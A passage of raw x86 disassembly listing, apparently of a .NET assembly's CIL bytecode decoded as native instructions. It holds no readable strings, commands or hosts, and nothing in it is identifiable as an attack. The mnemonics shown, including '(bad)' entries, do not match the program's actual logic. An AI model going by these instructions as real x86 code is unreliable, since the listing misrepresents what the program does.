  4025de:	12 00                	adc    (%eax),%al
  4025e0:	72 3b                	jb     0x40261d
  4025e2:	01 00                	add    %eax,(%eax)
  4025e4:	70 11                	jo     0x4025f7
  4025e6:	12 6f 27             	adc    0x27(%edi),%ch
  4025e9:	00 00                	add    %al,(%eax)
  4025eb:	0a 28                	or     (%eax),%ch
  4025ed:	28 00                	sub    %al,(%eax)
  4025ef:	00 0a                	add    %cl,(%edx)
  4025f1:	28 09                	sub    %cl,(%ecx)
  4025f3:	00 00                	add    %al,(%eax)
  4025f5:	0a 00                	or     (%eax),%al
  4025f7:	20 f4                	and    %dh,%ah
  4025f9:	01 00                	add    %eax,(%eax)
  4025fb:	00 28                	add    %ch,(%eax)
  4025fd:	1d 00 00 0a 00       	sbb    $0xa0000,%eax
  402602:	00 de                	add    %bl,%dh
  402604:	00 00                	add    %al,(%eax)
  402606:	00 00                	add    %al,(%eax)
  402608:	fe                   	(bad)
  402609:	13 7e 01             	adc    0x1(%esi),%edi
  40260c:	00 00                	add    %al,(%eax)
  40260e:	04 13                	add    $0x13,%al
  402610:	13 11                	adc    (%ecx),%edx
  402612:	13 3a                	adc    (%edx),%edi
  402614:	2d fd ff ff 00       	sub    $0xfffffd,%eax
  402619:	de 43 00             	fiadds 0x0(%ebx)
  40261c:	07                   	pop    %es
  40261d:	14 fe                	adc    $0xfe,%al
  40261f:	01 13                	add    %edx,(%ebx)
  402621:	13 11                	adc    (%ecx),%edx
  402623:	13 2d 07 07 6f 20    	adc    0x206f0707,%ebp
  402629:	00 00                	add    %al,(%eax)
  40262b:	0a 00                	or     (%eax),%al
  40262d:	7e 07                	jle    0x402636
  40262f:	00 00                	add    %al,(%eax)
  402631:	04 7e                	add    $0x7e,%al
  402633:	13 00                	adc    (%eax),%eax
  402635:	00 0a                	add    %cl,(%edx)
  402637:	28 29                	sub    %ch,(%ecx)
  402639:	00 00                	add    %al,(%eax)
  40263b:	0a 16                	or     (%esi),%dl
  40263d:	fe 01                	incb   (%ecx)
  40263f:	13 13                	adc    (%ebx),%edx
  402641:	11 13                	adc    %edx,(%ebx)
  402643:	2d 17 00 7e 07       	sub    $0x77e0017,%eax
  402648:	00 00                	add    %al,(%eax)
  40264a:	04 28                	add    $0x28,%al
  40264c:	14 00                	adc    $0x0,%al
  40264e:	00 06                	add    %al,(%esi)
  402650:	26 7e 13             	es jle 0x402666
  402653:	00 00                	add    %al,(%eax)
  402655:	0a 80 07 00 00 04    	or     0x4000007(%eax),%al
  40265b:	00 00                	add    %al,(%eax)
  40265d:	dc 00                	faddl  (%eax)
  40265f:	2a 41 c4             	sub    -0x3c(%ecx),%al
  402662:	00 00                	add    %al,(%eax)
  402664:	02 00                	add    (%eax),%al
  402666:	00 00                	add    %al,(%eax)
  402668:	f8                   	clc
  402669:	00 00                	add    %al,(%eax)
  40266b:	00 22                	add    %ah,(%edx)
  40266d:	00 00                	add    %al,(%eax)
  40266f:	00 1a                	add    %bl,(%edx)
  402671:	01 00                	add    %eax,(%eax)
  402673:	00 14 00             	add    %dl,(%eax,%eax,1)
  402676:	00 00                	add    %al,(%eax)
  402678:	00 00                	add    %al,(%eax)
  40267a:	00 00                	add    %al,(%eax)
  40267c:	02 00                	add    (%eax),%al
  40267e:	00 00                	add    %al,(%eax)
  402680:	de 01                	fiadds (%ecx)
  402682:	00 00                	add    %al,(%eax)
  402684:	22 00                	and    (%eax),%al
  402686:	00 00                	add    %al,(%eax)
  402688:	00 02                	add    %al,(%edx)
  40268a:	00 00                	add    %al,(%eax)
  40268c:	14 00                	adc    $0x0,%al
  40268e:	00 00                	add    %al,(%eax)
  402690:	00 00                	add    %al,(%eax)
  402692:	00 00                	add    %al,(%eax)
  402694:	02 00                	add    (%eax),%al
  402696:	00 00                	add    %al,(%eax)
  402698:	28 02                	sub    %al,(%edx)
  40269a:	00 00                	add    %al,(%eax)
  40269c:	10 00                	adc    %al,(%eax)
  40269e:	00 00                	add    %al,(%eax)
  4026a0:	38 02                	cmp    %al,(%edx)
  4026a2:	00 00                	add    %al,(%eax)
  4026a4:	0d 00 00 00 00       	or     $0x0,%eax
  4026a9:	00 00                	add    %al,(%eax)
  4026ab:	00 02                	add    %al,(%edx)
  4026ad:	00 00                	add    %al,(%eax)
  4026af:	00 1e                	add    %bl,(%esi)
  4026b1:	02 00                	add    (%eax),%al
  4026b3:	00 2b                	add    %ch,(%ebx)
  4026b5:	00 00                	add    %al,(%eax)
  4026b7:	00 49 02             	add    %cl,0x2(%ecx)
  4026ba:	00 00                	add    %al,(%eax)
  4026bc:	14 00                	adc    $0x0,%al
  4026be:	00 00                	add    %al,(%eax)
  4026c0:	00 00                	add    %al,(%eax)
  4026c2:	00 00                	add    %al,(%eax)
  4026c4:	02 00                	add    (%eax),%al
  4026c6:	00 00                	add    %al,(%eax)
  4026c8:	7a 02                	jp     0x4026cc
  4026ca:	00 00                	add    %al,(%eax)
  4026cc:	1b 00                	sbb    (%eax),%eax
  4026ce:	00 00                	add    %al,(%eax)
  4026d0:	95                   	xchg   %eax,%ebp
  4026d1:	02 00                	add    (%eax),%al
  4026d3:	00 14 00             	add    %dl,(%eax,%eax,1)
  4026d6:	00 00                	add    %al,(%eax)
  4026d8:	00 00                	add    %al,(%eax)
  4026da:	00 00                	add    %al,(%eax)
  4026dc:	02 00                	add    (%eax),%al
  4026de:	00 00                	add    %al,(%eax)
  4026e0:	d9 02                	flds   (%edx)
  4026e2:	00 00                	add    %al,(%eax)
  4026e4:	23 00                	and    (%eax),%eax
  4026e6:	00 00                	add    %al,(%eax)
  4026e8:	fc                   	cld
  4026e9:	02 00                	add    (%eax),%al
  4026eb:	00 14 00             	add    %dl,(%eax,%eax,1)
	...
  4026f6:	00 00                	add    %al,(%eax)
  4026f8:	a2 00 00 00 97       	mov    %al,0x97000000
  4026fd:	02 00                	add    (%eax),%al
  4026ff:	00 39                	add    %bh,(%ecx)
  402701:	03 00                	add    (%eax),%eax
  402703:	00 28                	add    %ch,(%eax)
  402705:	00 00                	add    %al,(%eax)
  402707:	00 23                	add    %ah,(%ebx)
  402709:	00 00                	add    %al,(%eax)
  40270b:	01 02                	add    %eax,(%edx)
  40270d:	00 00                	add    %al,(%eax)
  40270f:	00 9b 00 00 00 dc    	add    %bl,-0x24000000(%ebx)
  402715:	02 00                	add    (%eax),%al
  402717:	00 77 03             	add    %dh,0x3(%edi)
  40271a:	00 00                	add    %al,(%eax)
  40271c:	43                   	inc    %ebx
  40271d:	00 00                	add    %al,(%eax)
  40271f:	00 00                	add    %al,(%eax)
  402721:	00 00                	add    %al,(%eax)
  402723:	00 1e                	add    %bl,(%esi)
  402725:	02 28                	add    (%eax),%ch
  402727:	2a 00                	sub    (%eax),%al
  402729:	00 0a                	add    %cl,(%edx)
  40272b:	2a 13                	sub    (%ebx),%dl
  40272d:	30 04 00             	xor    %al,(%eax,%eax,1)
  402730:	c5 00                	lds    (%eax),%eax
  402732:	00 00                	add    %al,(%eax)
  402734:	04 00                	add    $0x0,%al
  402736:	00 11                	add    %dl,(%ecx)
  402738:	00 03                	add    %al,(%ebx)
  40273a:	28 17                	sub    %dl,(%edi)
  40273c:	00 00                	add    %al,(%eax)
  40273e:	06                   	push   %es
  40273f:	13 07                	adc    (%edi),%eax
  402741:	11 07                	adc    %eax,(%edi)
  402743:	2d 08 17 13 06       	sub    $0x6131708,%eax
  402748:	38 ad 00 00 00 03    	cmp    %ch,0x3000000(%ebp)
  40274e:	12 00                	adc    (%eax),%al
  402750:	28 19                	sub    %bl,(%ecx)
  402752:	00 00                	add    %al,(%eax)
  402754:	06                   	push   %es
  402755:	13 07                	adc    (%edi),%eax
  402757:	11 07                	adc    %eax,(%edi)
  402759:	2d 08 17 13 06       	sub    $0x6131708,%eax
  40275e:	38 97 00 00 00 12    	cmp    %dl,0x12000000(%edi)
  402764:	00 7b 2d             	add    %bh,0x2d(%ebx)
  402767:	00 00                	add    %al,(%eax)
  402769:	04 12                	add    $0x12,%al
  40276b:	00 7b 2b             	add    %bh,0x2b(%ebx)
  40276e:	00 00                	add    %al,(%eax)
  402770:	04 59                	add    $0x59,%al
  402772:	0b 12                	or     (%edx),%edx
  402774:	00 7b 2e             	add    %bh,0x2e(%ebx)
  402777:	00 00                	add    %al,(%eax)
  402779:	04 12                	add    $0x12,%al
  40277b:	00 7b 2c             	add    %bh,0x2c(%ebx)
  40277e:	00 00                	add    %al,(%eax)
  402780:	04 59                	add    $0x59,%al
  402782:	0c 07                	or     $0x7,%al
  402784:	1f                   	pop    %ds
  402785:	32 31                	xor    (%ecx),%dh
  402787:	07                   	pop    %es
  402788:	08 1f                	or     %bl,(%edi)
  40278a:	32 fe                	xor    %dh,%bh
  40278c:	02 2b                	add    (%ebx),%ch
  40278e:	01 16                	add    %edx,(%esi)
  402790:	00 13                	add    %dl,(%ebx)
  402792:	07                   	pop    %es
  402793:	11 07                	adc    %eax,(%edi)
  402795:	2d 05 17 13 06       	sub    $0x6131705,%eax
  40279a:	2b 5e 20             	sub    0x20(%esi),%ebx
  40279d:	00 02                	add    %al,(%edx)
  40279f:	00 00                	add    %al,(%eax)
  4027a1:	73 2b                	jae    0x4027ce
  4027a3:	00 00                	add    %al,(%eax)
  4027a5:	0a 0d 03 09 09 6f    	or     0x6f090903,%cl
  4027ab:	2c 00                	sub    $0x0,%al
  4027ad:	00 0a                	add    %cl,(%edx)
  4027af:	28 1a                	sub    %bl,(%edx)
  4027b1:	00 00                	add    %al,(%eax)
  4027b3:	06                   	push   %es
  4027b4:	26 09 6f 2d          	or     %ebp,%es:0x2d(%edi)
  4027b8:	00 00                	add    %al,(%eax)
  4027ba:	0a 13                	or     (%ebx),%dl
  4027bc:	04 02                	add    $0x2,%al
  4027be:	7b 2f                	jnp    0x4027ef
  4027c0:	00 00                	add    %al,(%eax)
  4027c2:	04 73                	add    $0x73,%al
  4027c4:	12 00                	adc    (%eax),%al
  4027c6:	00 06                	add    %al,(%esi)
  4027c8:	13 05 11 05 03 7d    	adc    0x7d030511,%eax
  4027ce:	12 00                	adc    (%eax),%al
  4027d0:	00 04 11             	add    %al,(%ecx,%edx,1)
  4027d3:	05 06 7d 13 00       	add    $0x137d06,%eax
  4027d8:	00 04 11             	add    %al,(%ecx,%edx,1)
  4027db:	05 11 04 7d 14       	add    $0x147d0411,%eax
  4027e0:	00 00                	add    %al,(%eax)
  4027e2:	04 11                	add    $0x11,%al
  4027e4:	05 07 08 5a 7d       	add    $0x7d5a0807,%eax
  4027e9:	15 00 00 04 11       	adc    $0x11040000,%eax
  4027ee:	05 6f 2e 00 00       	add    $0x2e6f,%eax
  4027f3:	0a 00                	or     (%eax),%al
  4027f5:	17                   	pop    %ss
  4027f6:	13 06                	adc    (%esi),%eax
  4027f8:	2b 00                	sub    (%eax),%eax
  4027fa:	11 06                	adc    %eax,(%esi)
  4027fc:	2a 00                	sub    (%eax),%al
  4027fe:	00 00                	add    %al,(%eax)
  402800:	1b 30                	sbb    (%eax),%esi
  402802:	03 00                	add    (%eax),%eax
  402804:	23 01                	and    (%ecx),%eax
  402806:	00 00                	add    %al,(%eax)
  402808:	05 00 00 11 73       	add    $0x73110000,%eax
  40280d:	21 00                	and    %eax,(%eax)
  40280f:	00 06                	add    %al,(%esi)
  402811:	0d 00 7e 07 00       	or     $0x77e00,%eax
  402816:	00 04 7e             	add    %al,(%esi,%edi,2)
  402819:	13 00                	adc    (%eax),%eax
  40281b:	00 0a                	add    %cl,(%edx)
  40281d:	28 14 00             	sub    %dl,(%eax,%eax,1)
  402820:	00 0a                	add    %cl,(%edx)
  402822:	16                   	push   %ss
  402823:	fe 01                	incb   (%ecx)
  402825:	13 04 11             	adc    (%ecx,%edx,1),%eax
  402828:	04 2d                	add    $0x2d,%al
  40282a:	05 38 fe 00 00       	add    $0xfe38,%eax
  40282f:	00 09                	add    %cl,(%ecx)
  402831:	73 2f                	jae    0x402862
  402833:	00 00                	add    %al,(%eax)
  402835:	0a 7d 2f             	or     0x2f(%ebp),%bh
  402838:	00 00                	add    %al,(%eax)
  40283a:	04 7e                	add    $0x7e,%al
  40283c:	07                   	pop    %es
  40283d:	00 00                	add    %al,(%eax)
  40283f:	04 09                	add    $0x9,%al
  402841:	fe 06                	incb   (%esi)
  402843:	22 00                	and    (%eax),%al
  402845:	00 06                	add    %al,(%esi)
  402847:	73 1d                	jae    0x402866
  402849:	00 00                	add    %al,(%eax)
  40284b:	06                   	push   %es
  40284c:	7e 13                	jle    0x402861
  40284e:	00 00                	add    %al,(%eax)
  402850:	0a 28                	or     (%eax),%ch
  402852:	16                   	push   %ss
  402853:	00 00                	add    %al,(%eax)
  402855:	06                   	push   %es
  402856:	26 14 0a             	es adc $0xa,%al
  402859:	00 09                	add    %cl,(%ecx)
  40285b:	7b 2f                	jnp    0x40288c
  40285d:	00 00                	add    %al,(%eax)
  40285f:	04 6f                	add    $0x6f,%al
  402861:	30 00                	xor    %al,(%eax)
  402863:	00 0a                	add    %cl,(%edx)
  402865:	13 05 2b 2a 12 05    	adc    0x5122a2b,%eax
  40286b:	28 31                	sub    %dh,(%ecx)
  40286d:	00 00                	add    %al,(%eax)
  40286f:	0a 0b                	or     (%ebx),%cl
  402871:	00 06                	add    %al,(%esi)
  402873:	2c 13                	sub    $0x13,%al
  402875:	07                   	pop    %es
  402876:	7b 15                	jnp    0x40288d
  402878:	00 00                	add    %al,(%eax)
  40287a:	04 06                	add    $0x6,%al
  40287c:	7b 15                	jnp    0x402893
  40287e:	00 00                	add    %al,(%eax)
  402880:	04 fe                	add    $0xfe,%al
  402882:	02 16                	add    (%esi),%dl
  402884:	fe 01                	incb   (%ecx)
  402886:	2b 01                	sub    (%ecx),%eax
  402888:	16                   	push   %ss
  402889:	00 13                	add    %dl,(%ebx)
  40288b:	04 11                	add    $0x11,%al
  40288d:	04 2d                	add    $0x2d,%al
  40288f:	02 07                	add    (%edi),%al
  402891:	0a 00                	or     (%eax),%al
  402893:	12 05 28 32 00 00    	adc    0x3228,%al
  402899:	0a 13                	or     (%ebx),%dl
  40289b:	04 11                	add    $0x11,%al
  40289d:	04 2d                	add    $0x2d,%al
  40289f:	c9                   	leave
  4028a0:	de 0f                	fimuls (%edi)
  4028a2:	12 05 fe 16 02 00    	adc    0x216fe,%al
  4028a8:	00 1b                	add    %bl,(%ebx)
  4028aa:	6f                   	outsl  %ds:(%esi),(%dx)
  4028ab:	25 00 00 0a 00       	and    $0xa0000,%eax
  4028b0:	dc 00                	faddl  (%eax)
  4028b2:	16                   	push   %ss
  4028b3:	0c 7e                	or     $0x7e,%al
  4028b5:	02 00                	add    (%eax),%al
  4028b7:	00 04 25 13 06 12 02 	add    %al,0x2120613(,%eiz,1)
  4028be:	28 1b                	sub    %bl,(%ebx)
  4028c0:	00 00                	add    %al,(%eax)
  4028c2:	0a 00                	or     (%eax),%al
  4028c4:	00 06                	add    %al,(%esi)
  4028c6:	14 fe                	adc    $0xfe,%al
  4028c8:	01 13                	add    %edx,(%ebx)
  4028ca:	04 11                	add    $0x11,%al
  4028cc:	04 2d                	add    $0x2d,%al
  4028ce:	25 00 06 7b 12       	and    $0x127b0600,%eax
  4028d3:	00 00                	add    %al,(%eax)
  4028d5:	04 80                	add    $0x80,%al
  4028d7:	08 00                	or     %al,(%eax)
  4028d9:	00 04 06             	add    %al,(%esi,%eax,1)
  4028dc:	7b 13                	jnp    0x4028f1
  4028de:	00 00                	add    %al,(%eax)
  4028e0:	04 80                	add    $0x80,%al
  4028e2:	09 00                	or     %eax,(%eax)
  4028e4:	00 04 06             	add    %al,(%esi,%eax,1)
  4028e7:	7b 14                	jnp    0x4028fd
  4028e9:	00 00                	add    %al,(%eax)
  4028eb:	04 80                	add    $0x80,%al
  4028ed:	0a 00                	or     (%eax),%al
  4028ef:	00 04 00             	add    %al,(%eax,%eax,1)
  4028f2:	2b 22                	sub    (%edx),%esp
  4028f4:	00 7e 13             	add    %bh,0x13(%esi)
  4028f7:	00 00                	add    %al,(%eax)
  4028f9:	0a 80 08 00 00 04    	or     0x4000008(%eax),%al
  4028ff:	72 5b                	jb     0x40295c
  402901:	01 00                	add    %eax,(%eax)
  402903:	70 80                	jo     0x402885
  402905:	0a 00                	or     (%eax),%al
  402907:	00 04 16             	add    %al,(%esi,%edx,1)
  40290a:	80 0c 00 00          	orb    $0x0,(%eax,%eax,1)
  40290e:	04 16                	add    $0x16,%al
  402910:	80 0d 00 00 04 00 00 	orb    $0x0,0x40000
  402917:	de 13                	ficoms (%ebx)
  402919:	08 16                	or     %dl,(%esi)
  40291b:	fe 01                	incb   (%ecx)
  40291d:	13 04 11             	adc    (%ecx,%edx,1),%eax
  402920:	04 2d                	add    $0x2d,%al
  402922:	08 11                	or     %dl,(%ecx)
  402924:	06                   	push   %es
  402925:	28 1c 00             	sub    %bl,(%eax,%eax,1)
  402928:	00 0a                	add    %cl,(%edx)
  40292a:	00 dc                	add    %bl,%ah
  40292c:	00 00                	add    %al,(%eax)
  40292e:	2a 00                	sub    (%eax),%al
  402930:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  402933:	00 02                	add    %al,(%edx)
  402935:	00 5b 00             	add    %bl,0x0(%ebx)
  402938:	3b 96 00 0f 00 00    	cmp    0xf00(%esi),%edx
  40293e:	00 00                	add    %al,(%eax)
  402940:	02 00                	add    (%eax),%al
  402942:	a8 00                	test   $0x0,%al
  402944:	65 0d 01 13 00 00    	gs or  $0x1301,%eax
  40294a:	00 00                	add    %al,(%eax)
  40294c:	1e                   	push   %ds
  40294d:	02 28                	add    (%eax),%ch
  40294f:	2a 00                	sub    (%eax),%al
  402951:	00 0a                	add    %cl,(%edx)
  402953:	2a 3a                	sub    (%edx),%bh
  402955:	00 02                	add    %al,(%edx)
  402957:	7b 30                	jnp    0x402989
  402959:	00 00                	add    %al,(%eax)
  40295b:	04 28                	add    $0x28,%al
  40295d:	06                   	push   %es
  40295e:	00 00                	add    %al,(%eax)
  402960:	06                   	push   %es
  402961:	00 2a                	add    %ch,(%edx)
  402963:	00 1b                	add    %bl,(%ebx)
  402965:	30 04 00             	xor    %al,(%eax,%eax,1)
  402968:	91                   	xchg   %eax,%ecx
  402969:	00 00                	add    %al,(%eax)
  40296b:	00 06                	add    %al,(%esi)
  40296d:	00 00                	add    %al,(%eax)
  40296f:	11 00                	adc    %eax,(%eax)
  402971:	73 33                	jae    0x4029a6
  402973:	00 00                	add    %al,(%eax)
  402975:	0a 0a                	or     (%edx),%cl
  402977:	06                   	push   %es
  402978:	6f                   	outsl  %ds:(%esi),(%dx)
  402979:	34 00                	xor    $0x0,%al
  40297b:	00 0a                	add    %cl,(%edx)
  40297d:	72 69                	jb     0x4029e8
  40297f:	01 00                	add    %eax,(%eax)
  402981:	70 7e                	jo     0x402a01
  402983:	04 00                	add    $0x0,%al
  402985:	00 04 8c             	add    %al,(%esp,%ecx,4)
  402988:	14 00                	adc    $0x0,%al
  40298a:	00 01                	add    %al,(%ecx)
  40298c:	72 8d                	jb     0x40291b
  40298e:	01 00                	add    %eax,(%eax)
  402990:	70 28                	jo     0x4029ba
  402992:	35 00 00 0a 6f       	xor    $0x6f0a0000,%eax
  402997:	36 00 00             	add    %al,%ss:(%eax)
  40299a:	0a 00                	or     (%eax),%al
  40299c:	06                   	push   %es
  40299d:	6f                   	outsl  %ds:(%esi),(%dx)
  40299e:	37                   	aaa
  40299f:	00 00                	add    %al,(%eax)
  4029a1:	0a 00                	or     (%eax),%al
  4029a3:	72 91                	jb     0x402936
  4029a5:	01 00                	add    %eax,(%eax)
  4029a7:	70 7e                	jo     0x402a27
  4029a9:	04 00                	add    $0x0,%al
  4029ab:	00 04 8c             	add    %al,(%esp,%ecx,4)
  4029ae:	14 00                	adc    $0x0,%al
  4029b0:	00 01                	add    %al,(%ecx)
  4029b2:	28 16                	sub    %dl,(%esi)
  4029b4:	00 00                	add    %al,(%eax)
  4029b6:	0a 00                	or     (%eax),%al
  4029b8:	2b 33                	sub    (%ebx),%esi
  4029ba:	73 23                	jae    0x4029df
  4029bc:	00 00                	add    %al,(%eax)
  4029be:	06                   	push   %es
  4029bf:	0b 00                	or     (%eax),%eax
  4029c1:	00 07                	add    %al,(%edi)
  4029c3:	06                   	push   %es
  4029c4:	6f                   	outsl  %ds:(%esi),(%dx)
  4029c5:	38 00                	cmp    %al,(%eax)
  4029c7:	00 0a                	add    %cl,(%edx)
  4029c9:	7d 30                	jge    0x4029fb
  4029cb:	00 00                	add    %al,(%eax)
  4029cd:	04 00                	add    $0x0,%al
  4029cf:	de 08                	fimuls (%eax)
  4029d1:	26 00 de             	es add %bl,%dh
  4029d4:	23 26                	and    (%esi),%esp
  4029d6:	00 de                	add    %bl,%dh
  4029d8:	1f                   	pop    %ds
  4029d9:	00 07                	add    %al,(%edi)
  4029db:	fe 06                	incb   (%esi)
  4029dd:	24 00                	and    $0x0,%al
  4029df:	00 06                	add    %al,(%esi)
  4029e1:	73 39                	jae    0x402a1c
  4029e3:	00 00                	add    %al,(%eax)
  4029e5:	0a 28                	or     (%eax),%ch
  4029e7:	3a 00                	cmp    (%eax),%al
  4029e9:	00 0a                	add    %cl,(%edx)
  4029eb:	26 00 fe             	es add %bh,%dh
  4029ee:	13 7e 01             	adc    0x1(%esi),%edi
  4029f1:	00 00                	add    %al,(%eax)
  4029f3:	04 0c                	add    $0xc,%al
  4029f5:	08 2d c2 00 06 6f    	or     %ch,0x6f0600c2
  4029fb:	3b 00                	cmp    (%eax),%eax
  4029fd:	00 0a                	add    %cl,(%edx)
  4029ff:	00 2a                	add    %ch,(%edx)
  402a01:	00 00                	add    %al,(%eax)
  402a03:	00 01                	add    %al,(%ecx)
  402a05:	1c 00                	sbb    $0x0,%al
  402a07:	00 00                	add    %al,(%eax)
  402a09:	00 51 00             	add    %dl,0x0(%ecx)
  402a0c:	10 61 00             	adc    %ah,0x0(%ecx)
  402a0f:	04 2a                	add    $0x2a,%al
  402a11:	00 00                	add    %al,(%eax)
  402a13:	01 00                	add    %eax,(%eax)
  402a15:	00 51 00             	add    %dl,0x0(%ecx)
  402a18:	10 65 00             	adc    %ah,0x0(%ebp)
  402a1b:	04 2b                	add    $0x2b,%al
  402a1d:	00 00                	add    %al,(%eax)
  402a1f:	01 1b                	add    %ebx,(%ebx)
  402a21:	30 04 00             	xor    %al,(%eax,%eax,1)
  402a24:	df 02                	filds  (%edx)
  402a26:	00 00                	add    %al,(%eax)
  402a28:	07                   	pop    %es
  402a29:	00 00                	add    %al,(%eax)
  402a2b:	11 00                	adc    %eax,(%eax)
  402a2d:	00 02                	add    %al,(%edx)
  402a2f:	6f                   	outsl  %ds:(%esi),(%dx)
  402a30:	3c 00                	cmp    $0x0,%al
  402a32:	00 0a                	add    %cl,(%edx)
  402a34:	6f                   	outsl  %ds:(%esi),(%dx)
  402a35:	3d 00 00 0a 6f       	cmp    $0x6f0a0000,%eax
  402a3a:	3e 00 00             	add    %al,%ds:(%eax)
  402a3d:	0a 25 2d 06 26 72    	or     0x7226062d,%ah
  402a43:	8d 01                	lea    (%ecx),%eax
  402a45:	00 70 0a             	add    %dh,0xa(%eax)
  402a48:	02 6f 3c             	add    0x3c(%edi),%ch
  402a4b:	00 00                	add    %al,(%eax)
  402a4d:	0a 6f 3f             	or     0x3f(%edi),%ch
  402a50:	00 00                	add    %al,(%eax)
  402a52:	0a 72 e1             	or     -0x1f(%edx),%dh
  402a55:	01 00                	add    %eax,(%eax)
  402a57:	70 28                	jo     0x402a81
  402a59:	11 00                	adc    %eax,(%eax)
  402a5b:	00 0a                	add    %cl,(%edx)
  402a5d:	2c 10                	sub    $0x10,%al
  402a5f:	06                   	push   %es
  402a60:	72 8d                	jb     0x4029ef
  402a62:	01 00                	add    %eax,(%eax)
  402a64:	70 28                	jo     0x402a8e
  402a66:	11 00                	adc    %eax,(%eax)
  402a68:	00 0a                	add    %cl,(%edx)
  402a6a:	16                   	push   %ss
  402a6b:	fe 01                	incb   (%ecx)
  402a6d:	2b 01                	sub    (%ecx),%eax
  402a6f:	17                   	pop    %ss
  402a70:	00 13                	add    %dl,(%ebx)
  402a72:	06                   	push   %es
  402a73:	11 06                	adc    %eax,(%esi)
  402a75:	2d 6f 00 28 40       	sub    $0x4028006f,%eax
  402a7a:	00 00                	add    %al,(%eax)
  402a7c:	0a 7e 10             	or     0x10(%esi),%bh
  402a7f:	00 00                	add    %al,(%eax)
  402a81:	04 6f                	add    $0x6f,%al
  402a83:	41                   	inc    %ecx
  402a84:	00 00                	add    %al,(%eax)
  402a86:	0a 0b                	or     (%ebx),%cl
  402a88:	02 6f 42             	add    0x42(%edi),%ch
  402a8b:	00 00                	add    %al,(%eax)
  402a8d:	0a 20                	or     (%eax),%ah
  402a8f:	c8 00 00 00          	enter  $0x0,$0x0
  402a93:	6f                   	outsl  %ds:(%esi),(%dx)
  402a94:	43                   	inc    %ebx
  402a95:	00 00                	add    %al,(%eax)
  402a97:	0a 00                	or     (%eax),%al
  402a99:	02 6f 42             	add    0x42(%edi),%ch
  402a9c:	00 00                	add    %al,(%eax)
  402a9e:	0a 72 e9             	or     -0x17(%edx),%dh
  402aa1:	01 00                	add    %eax,(%eax)
  402aa3:	70 6f                	jo     0x402b14
  402aa5:	44                   	inc    %esp
  402aa6:	00 00                	add    %al,(%eax)
  402aa8:	0a 00                	or     (%eax),%al
  402aaa:	02 6f 42             	add    0x42(%edi),%ch
  402aad:	00 00                	add    %al,(%eax)
  402aaf:	0a 07                	or     (%edi),%al
  402ab1:	8e 69 6a             	mov    0x6a(%ecx),%gs
  402ab4:	6f                   	outsl  %ds:(%esi),(%dx)
  402ab5:	45                   	inc    %ebp
  402ab6:	00 00                	add    %al,(%eax)
  402ab8:	0a 00                	or     (%eax),%al
  402aba:	02 6f 42             	add    0x42(%edi),%ch
  402abd:	00 00                	add    %al,(%eax)
  402abf:	0a 6f 46             	or     0x46(%edi),%ch
  402ac2:	00 00                	add    %al,(%eax)
  402ac4:	0a 07                	or     (%edi),%al
  402ac6:	16                   	push   %ss
  402ac7:	07                   	pop    %es
  402ac8:	8e 69 6f             	mov    0x6f(%ecx),%gs
  402acb:	47                   	inc    %edi
  402acc:	00 00                	add    %al,(%eax)
  402ace:	0a 00                	or     (%eax),%al
  402ad0:	02 6f 42             	add    0x42(%edi),%ch
  402ad3:	00 00                	add    %al,(%eax)
  402ad5:	0a 6f 46             	or     0x46(%edi),%ch
  402ad8:	00 00                	add    %al,(%eax)
  402ada:	0a 6f 48             	or     0x48(%edi),%ch
  402add:	00 00                	add    %al,(%eax)
  402adf:	0a 00                	or     (%eax),%al
  402ae1:	dd 23                	frstor (%ebx)
  402ae3:	02 00                	add    (%eax),%al
  402ae5:	00 02                	add    %al,(%edx)
  402ae7:	6f                   	outsl  %ds:(%esi),(%dx)
  402ae8:	3c 00                	cmp    $0x0,%al
  402aea:	00 0a                	add    %cl,(%edx)
  402aec:	6f                   	outsl  %ds:(%esi),(%dx)
  402aed:	3f                   	aas
  402aee:	00 00                	add    %al,(%eax)
  402af0:	0a 72 e1             	or     -0x1f(%edx),%dh
  402af3:	01 00                	add    %eax,(%eax)
  402af5:	70 28                	jo     0x402b1f
  402af7:	11 00                	adc    %eax,(%eax)
  402af9:	00 0a                	add    %cl,(%edx)
  402afb:	2c 10                	sub    $0x10,%al
  402afd:	06                   	push   %es
  402afe:	72 1b                	jb     0x402b1b
  402b00:	02 00                	add    (%eax),%al
  402b02:	70 28                	jo     0x402b2c
  402b04:	11 00                	adc    %eax,(%eax)
  402b06:	00 0a                	add    %cl,(%edx)
  402b08:	16                   	push   %ss
  402b09:	fe 01                	incb   (%ecx)
  402b0b:	2b 01                	sub    (%ecx),%eax
  402b0d:	17                   	pop    %ss
  402b0e:	00 13                	add    %dl,(%ebx)
  402b10:	06                   	push   %es
  402b11:	11 06                	adc    %eax,(%esi)
  402b13:	2d 0d 00 02 28       	sub    $0x2802000d,%eax
  402b18:	07                   	pop    %es
  402b19:	00 00                	add    %al,(%eax)
  402b1b:	06                   	push   %es
  402b1c:	00 dd                	add    %bl,%ch
  402b1e:	e7 01                	out    %eax,$0x1
  402b20:	00 00                	add    %al,(%eax)
  402b22:	02 6f 3c             	add    0x3c(%edi),%ch
  402b25:	00 00                	add    %al,(%eax)
  402b27:	0a 6f 3f             	or     0x3f(%edi),%ch
  402b2a:	00 00                	add    %al,(%eax)
  402b2c:	0a 72 2b             	or     0x2b(%edx),%dh
  402b2f:	02 00                	add    (%eax),%al
  402b31:	70 28                	jo     0x402b5b
  402b33:	11 00                	adc    %eax,(%eax)
  402b35:	00 0a                	add    %cl,(%edx)
  402b37:	2c 10                	sub    $0x10,%al
  402b39:	06                   	push   %es
  402b3a:	72 35                	jb     0x402b71
  402b3c:	02 00                	add    (%eax),%al
  402b3e:	70 28                	jo     0x402b68
  402b40:	11 00                	adc    %eax,(%eax)
  402b42:	00 0a                	add    %cl,(%edx)
  402b44:	16                   	push   %ss
  402b45:	fe 01                	incb   (%ecx)
  402b47:	2b 01                	sub    (%ecx),%eax
  402b49:	17                   	pop    %ss
  402b4a:	00 13                	add    %dl,(%ebx)
  402b4c:	06                   	push   %es
  402b4d:	11 06                	adc    %eax,(%esi)
  402b4f:	3a bd 00 00 00 00    	cmp    0x0(%ebp),%bh
  402b55:	02 6f 3c             	add    0x3c(%edi),%ch
  402b58:	00 00                	add    %al,(%eax)
  402b5a:	0a 6f 49             	or     0x49(%edi),%ch
  402b5d:	00 00                	add    %al,(%eax)
  402b5f:	0a 02                	or     (%edx),%al
  402b61:	6f                   	outsl  %ds:(%esi),(%dx)
  402b62:	3c 00                	cmp    $0x0,%al
  402b64:	00 0a                	add    %cl,(%edx)
  402b66:	6f                   	outsl  %ds:(%esi),(%dx)
